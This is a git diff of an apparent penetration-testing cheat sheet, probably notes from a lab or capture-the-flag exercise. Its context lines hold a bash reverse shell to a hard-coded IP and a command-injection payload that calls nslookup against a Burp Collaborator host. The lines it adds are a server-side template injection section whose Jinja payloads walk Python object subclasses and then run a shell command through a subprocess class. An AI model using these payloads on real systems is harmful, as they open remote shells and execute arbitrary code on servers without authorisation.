@@ -77,6 +77,14 @@ bash -c "bash -i >& /dev/tcp/10.2.8.75/8080 0>&1"
 email=x||nslookup+x.burpcollaborator.net||
 
 ```
+# SSTI
+
+for python
+
+```bash
+http://10.10.171.65:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}
+http://10.10.171.65:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}
+```
 
 # XXE Attacks
 
